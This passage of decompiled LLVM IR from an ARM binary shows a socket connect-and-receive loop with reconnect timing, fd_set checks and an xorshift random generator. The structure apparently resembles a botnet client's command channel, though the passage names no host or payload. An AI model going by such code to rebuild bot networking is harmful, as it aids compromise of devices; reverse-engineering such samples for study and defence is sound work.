  br i1 %v5_e568, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_e558
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_e558, %bb
  %v0_e580 = phi i32 [ %v2_e558, %dec_label_pc_e558 ], [ %v2_e55c, %bb ]
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-60, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e580 = add i32 %v0_e580, 1
  store i32 %v2_e4ac, i32* %r2.global-to-local, align 4
  %v5_e594 = call i32 @function_11d10(i32 %v1_e580, i32 %v2_e4a8, i32 %v2_e4ac, i32 0, i32 %v2_e57c)
  %v8_e598 = icmp eq i32 %v5_e594, -1
  store i32 %v5_e594, i32* %r3.global-to-local, align 4
  br i1 %v8_e598, label %dec_label_pc_e4b0.backedge, label %dec_label_pc_e5a4

dec_label_pc_e5a4:                                ; preds = %bb40
  %v6_e594 = trunc i32 %v5_e594 to i8
  %v3_e5a4 = icmp eq i8 %v6_e594, 0
  br i1 %v3_e5a4, label %dec_label_pc_e5ac, label %dec_label_pc_e5cc

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e5a4
  %v0_e5ac = load i32, i32* @sb, align 4
  %v6_e5b8 = inttoptr i32 %v5_e594 to i8*
  store i8* %v6_e5b8, i8** %stack_var_-38, align 4
  %v2_e5bc = call i32 @function_11944(i32 %v0_e5ac, i32 6)
  %v2_e5c0 = icmp eq i32 %v2_e5bc, 0
  %v0_e5c4 = load i32, i32* @sb, align 4
  %v1_e5c4 = add i32 %v0_e5c4, 1
  store i32 %v1_e5c4, i32* @sb, align 4
  br i1 %v2_e5c0, label %dec_label_pc_e81c, label %dec_label_pc_e5cc

dec_label_pc_e5cc:                                ; preds = %dec_label_pc_e5a4, %dec_label_pc_e5ac, %dec_label_pc_e81c
  store i32 ptrtoint (i8** @global_var_1ca8c.103 to i32), i32* %r2.global-to-local, align 4
  %v2_e5d0 = load i8, i8* bitcast (i8** @global_var_1ca8c.103 to i8*), align 4
  %v3_e5d0 = zext i8 %v2_e5d0 to i32
  store i32 %v3_e5d0, i32* @r4, align 4
  %v2_e5d4 = icmp eq i8 %v2_e5d0, 0
  %v2_e65c = load i32, i32* @global_var_1c90c.101, align 4
  br i1 %v2_e5d4, label %dec_label_pc_e65c, label %dec_label_pc_e5dc

dec_label_pc_e5dc:                                ; preds = %dec_label_pc_e5cc
  %v3_e5e0 = udiv i32 %v2_e65c, 32
  %v3_e5e8 = mul nuw nsw i32 %v3_e5e0, 4
  %v2_e5ec = add i32 %v3_e5e8, %v2_e348
  store i32 %v2_e5ec, i32* %r3.global-to-local, align 4
  %v1_e5f0 = add i32 %v2_e5ec, -344
  %v2_e5f0 = inttoptr i32 %v1_e5f0 to i32*
  %v3_e5f0 = load i32, i32* %v2_e5f0, align 4
  %v1_e5f4 = urem i32 %v2_e65c, 32
  %v6_e5f8 = lshr i32 %v3_e5f0, %v1_e5f4
  store i32 %v6_e5f8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ca8c.103 to i32), i32* %r3.global-to-local, align 4
  %v1_e604 = urem i32 %v6_e5f8, 2
  %v2_e604 = icmp eq i32 %v1_e604, 0
  store i8 0, i8* bitcast (i8** @global_var_1ca8c.103 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1c90c.101 to i32), i32* @r4, align 4
  br i1 %v2_e604, label %dec_label_pc_e614, label %dec_label_pc_e7bc

dec_label_pc_e614:                                ; preds = %dec_label_pc_e5dc
  store i32 58908, i32* @lr, align 4
  %v1_e618 = icmp ne i32 %v2_e65c, -1
  call void @__pseudo_cond_branch(i1 %v1_e618, i32 ptrtoint (i32* @global_var_11af0.104 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e620 = load i32, i32* @r4, align 4
  %v2_e620 = inttoptr i32 %v1_e620 to i32*
  store i32 -1, i32* %v2_e620, align 4
  %v1_e628 = call i32 @function_12efc(i32 1)
  br label %dec_label_pc_e4b0.backedge

dec_label_pc_e4b0.backedge:                       ; preds = %dec_label_pc_e614, %dec_label_pc_e728, %dec_label_pc_e7f4, %dec_label_pc_e890, %dec_label_pc_e8bc, %dec_label_pc_e8d8, %dec_label_pc_e940, %bb40, %dec_label_pc_e65c, %dec_label_pc_e66c, %dec_label_pc_e83c, %bb42, %dec_label_pc_e8ec, %dec_label_pc_e8a8
  %v2_e4b843.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e4b0

dec_label_pc_e630:                                ; preds = %dec_label_pc_e520
  store i32 %v2_e348, i32* %r2.global-to-local, align 4
  %v3_e63c = mul nuw nsw i32 %v3_e634, 4
  %v2_e640 = add i32 %v3_e63c, %v2_e348
  store i32 %v2_e640, i32* %r3.global-to-local, align 4
  %v1_e644 = add i32 %v2_e640, -216
  %v2_e644 = inttoptr i32 %v1_e644 to i32*
  %v3_e644 = load i32, i32* %v2_e644, align 4
  %v1_e648 = urem i32 %v2_e630, 32
  %v7_e650 = shl i32 1, %v1_e648
  %v8_e650 = or i32 %v3_e644, %v7_e650
  store i32 %v8_e650, i32* %r2.global-to-local, align 4
  store i32 %v8_e650, i32* %v2_e644, align 4
  br label %dec_label_pc_e558

dec_label_pc_e65c:                                ; preds = %dec_label_pc_e5cc
  %v7_e660 = icmp eq i32 %v2_e65c, -1
  store i32 ptrtoint (i32* @global_var_1c90c.101 to i32), i32* @r8, align 4
  br i1 %v7_e660, label %dec_label_pc_e4b0.backedge, label %dec_label_pc_e66c

dec_label_pc_e66c:                                ; preds = %dec_label_pc_e65c
  %v3_e66c = udiv i32 %v2_e65c, 32
  %v3_e670 = mul nuw nsw i32 %v3_e66c, 4
  %v2_e678 = add i32 %v3_e670, %v2_e348
  store i32 %v2_e678, i32* %r3.global-to-local, align 4
  %v1_e67c = add i32 %v2_e678, -216
  %v2_e67c = inttoptr i32 %v1_e67c to i32*
  %v3_e67c = load i32, i32* %v2_e67c, align 4
  %v1_e680 = urem i32 %v2_e65c, 32
  %v6_e684 = lshr i32 %v3_e67c, %v1_e680
  store i32 %v6_e684, i32* %r2.global-to-local, align 4
  %v1_e688 = urem i32 %v6_e684, 2
  %v2_e688 = icmp eq i32 %v1_e688, 0
  br i1 %v2_e688, label %dec_label_pc_e4b0.backedge, label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %dec_label_pc_e66c
  %v6_e690 = inttoptr i32 %v3_e5d0 to i8*
  store i8* %v6_e690, i8** %stack_var_-38, align 4
  %v0_e698 = call i32 @function_120c4()
  %v0_e69c = load i32, i32* @r4, align 4
  %v2_e69c = inttoptr i32 %v0_e698 to i32*
  store i32 %v0_e69c, i32* %v2_e69c, align 4
  store i32 %v0_e698, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e6b0 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_e6bc = call i32 @function_122f0(i32 %v2_e6b0, i32* %v4_e834, i32 2, i32 16386)
  %v7_e6c0 = icmp eq i32 %v5_e6bc, -1
  br i1 %v7_e6c0, label %dec_label_pc_e8a8, label %dec_label_pc_e6c8

dec_label_pc_e6c8:                                ; preds = %dec_label_pc_e690
  %v2_e6c8 = icmp eq i32 %v5_e6bc, 0
  br i1 %v2_e6c8, label %dec_label_pc_e728, label %dec_label_pc_e6d0

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e6c8
  %v3_e6d0 = load i8*, i8** %stack_var_-38, align 4
  %v4_e6d0 = ptrtoint i8* %v3_e6d0 to i32
  store i32 %v3_e5d0, i32* %r3.global-to-local, align 4
  %v4_e6d8 = mul nuw nsw i32 %v3_e5d0, 256
  %v5_e6d8 = or i32 %v4_e6d0, %v4_e6d8
  store i32 %v5_e6d8, i32* %r2.global-to-local, align 4
  %v7_e6d8 = icmp eq i32 %v5_e6d8, 0
  br i1 %v7_e6d8, label %dec_label_pc_e8bc, label %dec_label_pc_e6e0

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e6d0
  %v1_e6e0 = mul i32 %v4_e6d0, 256
  %v3_e6e4 = and i32 %v1_e6e0, 65280
  %v4_e6e8 = udiv i32 %v5_e6d8, 256
  %v5_e6e8 = or i32 %v3_e6e4, %v4_e6e8
  %v6_e6e8 = trunc i32 %v4_e6e8 to i8
  store i32 %v5_e6e8, i32* %r2.global-to-local, align 4
  %v4_e6ec = udiv i32 %v5_e6d8, 65536
  store i32 %v4_e6ec, i32* %r3.global-to-local, align 4
  %v3_e6f0 = icmp slt i8 %v6_e6e8, 0
  %v7_e6f8 = inttoptr i32 %v4_e6e8 to i8*
  store i8* %v7_e6f8, i8** %stack_var_-38, align 4
  br i1 %v3_e6f0, label %dec_label_pc_e8d8, label %dec_label_pc_e700

dec_label_pc_e700:                                ; preds = %dec_label_pc_e6e0
  %v0_e700 = load i32, i32* @r4, align 4
  %v1_e700 = load i32, i32* @r5, align 4
  %v2_e700 = inttoptr i32 %v1_e700 to i32*
  store i32 %v0_e700, i32* %v2_e700, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e70c = load i32, i32* @global_var_1c90c.101, align 4
  %v9_e714 = call i32 @function_122f0(i32 %v2_e70c, i32* nonnull %stack_var_-1532, i32 %v4_e6e8, i32 16386)
  %v7_e718 = icmp eq i32 %v9_e714, -1
  br i1 %v7_e718, label %dec_label_pc_e8a8, label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %dec_label_pc_e700
  %v2_e720 = icmp eq i32 %v9_e714, 0
  br i1 %v2_e720, label %dec_label_pc_e728, label %dec_label_pc_e8ec

dec_label_pc_e728:                                ; preds = %bb42, %dec_label_pc_e720, %dec_label_pc_e6c8
  %v2_e728 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 59188, i32* @lr, align 4
  %v1_e730 = icmp ne i32 %v2_e728, -1
  call void @__pseudo_cond_branch(i1 %v1_e730, i32 ptrtoint (i32* @global_var_11af0.104 to i32))
  store i32 ptrtoint (i32* @global_var_1c90c.101 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1c90c.101, align 4
  %v1_e744 = call i32 @function_12efc(i32 1)
  br label %dec_label_pc_e4b0.backedge

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e510
  %v0_e754 = load i32, i32* @r4, align 4
  store i32 %v0_e754, i32* %r2.global-to-local, align 4
  %v3_e758 = call i32 @function_123e0(i32 2, i32 1, i32 %v0_e754)
  %v7_e75c = icmp eq i32 %v3_e758, -1
  store i32 %v3_e758, i32* @r5, align 4
  %v1_e764 = load i32, i32* %r8.global-to-local, align 4
  %v2_e764 = inttoptr i32 %v1_e764 to i32*
  store i32 %v3_e758, i32* %v2_e764, align 4
  br i1 %v7_e75c, label %dec_label_pc_e520, label %dec_label_pc_e76c

dec_label_pc_e76c:                                ; preds = %dec_label_pc_e74c
  %v0_e76c = load i32, i32* @r4, align 4
  store i32 %v0_e76c, i32* @r2, align 4
  %v2_e774 = call i32 @function_11a2c(i32 %v3_e758, i32 3)
  %v1_e77c = or i32 %v2_e774, 2048
  store i32 %v1_e77c, i32* @r2, align 4
  %v0_e780 = load i32, i32* @r5, align 4
  %v2_e784 = call i32 @function_11a2c(i32 %v0_e780, i32 4)
  store i32 ptrtoint (i32* @global_var_1c910.72 to i32), i32* %r2.global-to-local, align 4
  %v2_e78c = load i32, i32* @global_var_1c910.72, align 4
  store i32 %v2_e78c, i32* %r3.global-to-local, align 4
  %v2_e790 = icmp eq i32 %v2_e78c, 0
  br i1 %v2_e790, label %.thread, label %bb41

bb41:                                             ; preds = %dec_label_pc_e76c
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_114a4.105 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e76c, %bb41
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_e7a4 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1ca8c.103 to i8*), align 4
  %v5_e7b4 = call i32 @function_1223c(i32 %v2_e7a4, %sockaddr* bitcast (i8** @global_var_1cb28.81 to %sockaddr*), i32 16)
  br label %dec_label_pc_e520

dec_label_pc_e7bc:                                ; preds = %dec_label_pc_e5dc
  store i32 4, i32* @r5, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v2_e7cc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-48, align 4
  %v6_e7e4 = call i32 @function_12294(i32 %v2_e65c, i32 1, i32 4, i32* nonnull %stack_var_-44, i32 %v2_e7d0)
  %v3_e7e8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e7e8, i32* %r3.global-to-local, align 4
  %v2_e7ec = icmp eq i32 %v3_e7e8, 0
  br i1 %v2_e7ec, label %dec_label_pc_e83c, label %dec_label_pc_e7f4

dec_label_pc_e7f4:                                ; preds = %dec_label_pc_e7bc
  %v2_e7f4 = load i32, i32* @global_var_1c90c.101, align 4
  %v1_e7f8 = call i32 @function_11af0(i32 %v2_e7f4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e800 = load i32, i32* @r4, align 4
  %v2_e800 = inttoptr i32 %v1_e800 to i32*
  store i32 -1, i32* %v2_e800, align 4
  %v0_e804 = call i32 @function_e978()
  %v2_e80c = call i32 @function_11878(i32 %v0_e804, i32 10)
  %v1_e810 = add i32 %v2_e80c, 1
  %v1_e814 = call i32 @function_12efc(i32 %v1_e810)
  br label %dec_label_pc_e4b0.backedge

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e5ac
  %v2_e824 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e834 = call i32 @function_12350(i32 %v2_e824, i32* nonnull %v4_e834, i32 2, i32 16384)
  br label %dec_label_pc_e5cc

dec_label_pc_e83c:                                ; preds = %dec_label_pc_e7bc
  %v2_e844 = call i32 @function_111ec(i8* %v1_e844)
  %sext = mul i32 %v2_e844, 16777216
  %v1_e848 = sdiv i32 %sext, 16777216
  %v7_e848 = inttoptr i32 %v1_e848 to i8*
  store i8* %v7_e848, i8** %stack_var_-38, align 4
  %v0_e84c = call i32 @function_114a4()
  store i32 %v0_e84c, i32* @global_var_1cb1c.49, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e860 = load i32, i32* @r5, align 4
  store i32 %v0_e860, i32* %r2.global-to-local, align 4
  %v2_e864 = load i32, i32* @global_var_1c90c.101, align 4
  %v5_e868 = call i32 @function_12350(i32 %v2_e864, i32* nonnull @global_var_14394.107, i32 %v0_e860, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_e874 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e880 = call i32 @function_12350(i32 %v2_e874, i32* %v4_e834, i32 1, i32 16384)
  %v3_e884 = load i8*, i8** %stack_var_-38, align 4
  %v4_e884 = ptrtoint i8* %v3_e884 to i32
  store i32 %v4_e884, i32* %r2.global-to-local, align 4
  %v3_e888 = icmp eq i8* %v3_e884, null
  br i1 %v3_e888, label %dec_label_pc_e4b0.backedge, label %dec_label_pc_e890

dec_label_pc_e890:                                ; preds = %dec_label_pc_e83c
  %v2_e894 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e8a0 = call i32 @function_12350(i32 %v2_e894, i32* nonnull %stack_var_-124, i32 %v4_e884, i32 16384)
  br label %dec_label_pc_e4b0.backedge

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e700, %dec_label_pc_e690
  %v0_e8a8 = load i32, i32* @r5, align 4
  %v1_e8a8 = inttoptr i32 %v0_e8a8 to i32*
  %v2_e8a8 = load i32, i32* %v1_e8a8, align 4
  store i32 %v2_e8a8, i32* %r3.global-to-local, align 4
  %v7_e8ac = icmp eq i32 %v2_e8a8, 4
  br i1 %v7_e8ac, label %dec_label_pc_e4b0.backedge, label %bb42

bb42:                                             ; preds = %dec_label_pc_e8a8
  %v8_e8b0 = icmp eq i32 %v2_e8a8, 11
  br i1 %v8_e8b0, label %dec_label_pc_e4b0.backedge, label %dec_label_pc_e728

dec_label_pc_e8bc:                                ; preds = %dec_label_pc_e6d0
  %v2_e8c0 = load i32, i32* @global_var_1c90c.101, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e8d0 = call i32 @function_122f0(i32 %v2_e8c0, i32* nonnull %v4_e834, i32 2, i32 16384)
  br label %dec_label_pc_e4b0.backedge

dec_label_pc_e8d8:                                ; preds = %dec_label_pc_e6e0
  %v2_e8d8 = load i32, i32* @global_var_1c90c.101, align 4
  %v1_e8dc = call i32 @function_11af0(i32 %v2_e8d8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e8e4 = load i32, i32* @r8, align 4
  %v2_e8e4 = inttoptr i32 %v1_e8e4 to i32*
  store i32 -1, i32* %v2_e8e4, align 4
  br label %dec_label_pc_e4b0.backedge

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e720
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e8fc = load i32, i32* @global_var_1c90c.101, align 4
  %v5_e900 = call i32 @function_122f0(i32 %v2_e8fc, i32* nonnull %v4_e834, i32 2, i32 16384)
  %v3_e904 = load i8*, i8** %stack_var_-38, align 4
  %v4_e904 = ptrtoint i8* %v3_e904 to i32
  %v4_e908 = urem i32 %v4_e6ec, 256
  %v4_e90c = mul i32 %v4_e904, 256
  %v5_e90c = or i32 %v4_e90c, %v4_e908
  store i32 %v5_e90c, i32* %r2.global-to-local, align 4
  %v3_e914 = sdiv i32 %v4_e90c, 256
  store i32 %v3_e914, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e920 = load i32, i32* @global_var_1c90c.101, align 4
  %v6_e928 = inttoptr i32 %v5_e90c to i8*
  store i8* %v6_e928, i8** %stack_var_-38, align 4
  %v8_e92c = call i32 @function_122f0(i32 %v2_e920, i32* nonnull %stack_var_-1532, i32 %v5_e90c, i32 16384)
  %v3_e930 = load i8*, i8** %stack_var_-38, align 4
  %v4_e930 = ptrtoint i8* %v3_e930 to i32
  store i32 %v4_e930, i32* %r2.global-to-local, align 4
  %v4_e934 = urem i32 %v3_e914, 256
  store i32 %v4_e934, i32* %r3.global-to-local, align 4
  %v6_e938 = mul nuw nsw i32 %v4_e934, 256
  %v7_e938 = or i32 %v4_e930, %v6_e938
  %v9_e938 = icmp eq i32 %v7_e938, 0
  br i1 %v9_e938, label %dec_label_pc_e4b0.backedge, label %dec_label_pc_e940

dec_label_pc_e940:                                ; preds = %dec_label_pc_e8ec
  %v7_e944 = call i32 @function_8320(i32* nonnull %stack_var_-1532, i32 %v7_e938, i32 %v4_e930, i32 %v4_e934)
  br label %dec_label_pc_e4b0.backedge

; uselistorder directives
  uselistorder i32 %v4_e934, { 2, 0, 1 }
  uselistorder i32 %v4_e930, { 1, 0, 2 }
  uselistorder i32 %v3_e914, { 1, 0 }
  uselistorder i32 %v5_e90c, { 1, 0, 2 }
  uselistorder i32 %v4_e90c, { 1, 0 }
  uselistorder i32 %v3_e758, { 1, 3, 2, 0 }
  uselistorder i32 %v9_e714, { 1, 0 }
  uselistorder i32 %v4_e6e8, { 2, 3, 0, 1 }
  uselistorder i32 %v5_e6bc, { 1, 0 }
  uselistorder i32 %v2_e65c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_e594, { 2, 3, 1, 0 }
  uselistorder i32 %v2_e4e0, { 2, 1, 0 }
  uselistorder i32 %v1_e4d4, { 1, 2, 0 }
  uselistorder i32 %v1_e4bc, { 1, 2, 0 }
  uselistorder i32* %v4_e834, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v2_e4ac, { 1, 0, 2 }
  uselistorder i32 %v2_e4a8, { 1, 0, 2 }
  uselistorder i32 %v2_e348, { 0, 1, 7, 2, 3, 4, 5, 6, 8 }
  uselistorder i32 %v2_e338, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_e254, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-124, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i8** %stack_var_-38, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 22, 30, 31, 32, 43, 44, 36, 37, 33, 41, 42, 34, 35, 38, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i8* bitcast (i8** @global_var_1ca8c.103 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1ca8c.103, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ca8c.103 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1c908.74, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_1c90c.101, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32 (i32)* @function_e15c, { 1, 0 }
  uselistorder i32 (i32)* @function_d760, { 1, 0 }
  uselistorder i32 (i32)* @function_8650, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_ea2c, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_df60, { 1, 0 }
  uselistorder i32* @global_var_1c910.72, { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_e0d0.70 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_12454, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e4b0.backedge, { 6, 12, 5, 4, 11, 13, 3, 10, 2, 1, 9, 8, 0, 7 }
  uselistorder label %dec_label_pc_e5cc, { 2, 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_e520, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e510, { 1, 0 }
  uselistorder label %dec_label_pc_e4d0.dec_label_pc_e4d0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e4b8.dec_label_pc_e4b8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e304, { 2, 0, 1 }
}

define i32 @function_e978() local_unnamed_addr {
dec_label_pc_e978:
  %v2_e984 = load i32, i32* @global_var_1ca90.109, align 4
  %v2_e988 = load i32, i32* @global_var_1ca9c.111, align 4
  store i32 ptrtoint (i32* @global_var_1ca94.113 to i32), i32* @lr, align 4
  %v4_e994 = mul i32 %v2_e984, 2048
  %v5_e994 = xor i32 %v4_e994, %v2_e984
  %v4_e998 = udiv i32 %v2_e988, 524288
  %v5_e998 = xor i32 %v4_e998, %v2_e988
  %v2_e99c = load i32, i32* @global_var_1ca94.113, align 4
  %v2_e9a0 = load i32, i32* @global_var_1ca98.115, align 4
  %v2_e9a4 = xor i32 %v5_e998, %v5_e994
  %v4_e9a8 = udiv i32 %v5_e994, 256
  %v5_e9a8 = xor i32 %v2_e9a4, %v4_e9a8
  store i32 %v2_e99c, i32* @global_var_1ca90.109, align 4
  store i32 %v2_e9a0, i32* @global_var_1ca94.113, align 4
  store i32 %v2_e988, i32* @global_var_1ca98.115, align 4
  store i32 %v5_e9a8, i32* @global_var_1ca9c.111, align 4
  ret i32 %v5_e9a8

; uselistorder directives
  uselistorder i32 %v2_e988, { 2, 1, 0 }
  uselistorder i32 %v2_e984, { 1, 0 }
}

define i32 @function_e9d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_e9d0:
  %stack_var_-12 = alloca i32, align 4
  %v3_e9d0 = load i32, i32* @r4, align 4
  store i32 %v3_e9d0, i32* %stack_var_-12, align 4
  %v2_e9d8 = call i32 @function_11dc0(i32* null)
  store i32 %v2_e9d8, i32* @global_var_1ca90.109, align 4
  %v0_e9e4 = call i32 @function_11b48()
  store i32 %v0_e9e4, i32* @r4, align 4
  %v0_e9ec = call i32 @function_11b74()
  %v0_e9f4 = load i32, i32* @r4, align 4
  %v2_e9f4 = xor i32 %v0_e9f4, %v0_e9ec
  store i32 %v2_e9f4, i32* @r4, align 4
  store i32 %v2_e9f4, i32* @global_var_1ca94.113, align 4
  %v1_e9fc = call i32 @function_120d0(i32 %v0_e9ec)
  %v2_ea00 = load i32, i32* @global_var_1ca94.113, align 4
  %v2_ea0c = xor i32 %v2_ea00, %v1_e9fc
  store i32 %v2_ea0c, i32* @global_var_1ca9c.111, align 4
  store i32 %v1_e9fc, i32* @global_var_1ca98.115, align 4
  %v2_ea18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ea18, i32* @r4, align 4
  ret i32 %v1_e9fc

; uselistorder directives
  uselistorder i32 %v1_e9fc, { 1, 2, 0 }
  uselistorder i32 %v0_e9ec, { 1, 0 }
  uselistorder i32 ()* @function_11b74, { 2, 0, 1 }
}

define i32 @function_ea2c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ea2c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_ea2c = load i32, i32* @r4, align 4
  store i32 %v3_ea2c, i32* %stack_var_-36, align 4
  %v6_ea2c = load i32, i32* @r5, align 4
  %v9_ea2c = load i32, i32* @r6, align 4
  %v12_ea2c = load i32, i32* @r7, align 4
  %v28_ea2c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_ea34 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_ea40 = call i32 @function_10c20(i32 28)
  %v3_ea4c = call i32 @function_10b3c(i32 28, i32* null)
  %v2_ea58 = inttoptr i32 %v3_ea4c to i8*
  %v3_ea58 = call i32 @function_121d0(i32 %v2_ea34, i8* %v2_ea58)
  %v2_ea5c = icmp eq i32 %arg2, 0
  br i1 %v2_ea5c, label %dec_label_pc_ead8, label %dec_label_pc_ea64

dec_label_pc_ea64:                                ; preds = %dec_label_pc_ea2c
  store i32 ptrtoint (i32* @global_var_1ca90.109 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ca94.113 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ca98.115 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1ca9c.111 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_eaac = bitcast i32* %stack_var_-68 to i8*
  br label %dec_label_pc_ea78

dec_label_pc_ea78:                                ; preds = %dec_label_pc_ea78.dec_label_pc_ea78_crit_edge, %dec_label_pc_ea64
  %v1_ea9c = phi i32 [ %v1_ea9c.pre, %dec_label_pc_ea78.dec_label_pc_ea78_crit_edge ], [ ptrtoint (i32* @global_var_1ca90.109 to i32), %dec_label_pc_ea64 ]
  %v2_ea78 = load i32, i32* @global_var_1ca9c.111, align 4
  store i32 %v2_ea78, i32* %r2.global-to-local, align 4
  %v2_ea7c = load i32, i32* @global_var_1ca90.109, align 4
  %v4_ea80 = udiv i32 %v2_ea78, 524288
  %v5_ea80 = xor i32 %v4_ea80, %v2_ea78
  %v4_ea84 = mul i32 %v2_ea7c, 2048
  %v5_ea84 = xor i32 %v4_ea84, %v2_ea7c
  %v2_ea88 = xor i32 %v5_ea80, %v5_ea84
  %v2_ea8c = load i32, i32* @global_var_1ca94.113, align 4
  %v2_ea90 = load i32, i32* @global_var_1ca98.115, align 4
  store i32 %v2_ea90, i32* %ip.global-to-local, align 4
  %v4_ea94 = udiv i32 %v5_ea84, 256
  %v5_ea94 = xor i32 %v2_ea88, %v4_ea94
  store i32 %v5_ea94, i32* @r4, align 4
  %v2_ea9c = inttoptr i32 %v1_ea9c to i32*
  store i32 %v2_ea8c, i32* %v2_ea9c, align 4
  %v0_eaa0 = load i32, i32* %ip.global-to-local, align 4
  %v1_eaa0 = load i32, i32* %r8.global-to-local, align 4
  %v2_eaa0 = inttoptr i32 %v1_eaa0 to i32*
  store i32 %v0_eaa0, i32* %v2_eaa0, align 4
  %v0_eaa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_eaa4 = load i32, i32* @r7, align 4
  %v2_eaa4 = inttoptr i32 %v1_eaa4 to i32*
  store i32 %v0_eaa4, i32* %v2_eaa4, align 4
  %v0_eaa8 = load i32, i32* @r4, align 4
  %v1_eaa8 = load i32, i32* @r6, align 4
  %v2_eaa8 = inttoptr i32 %v1_eaa8 to i32*
  store i32 %v0_eaa8, i32* %v2_eaa8, align 4
  %v2_eaac = call i32 @function_111ec(i8* %v1_eaac)
  %v0_eab4 = load i32, i32* @r4, align 4
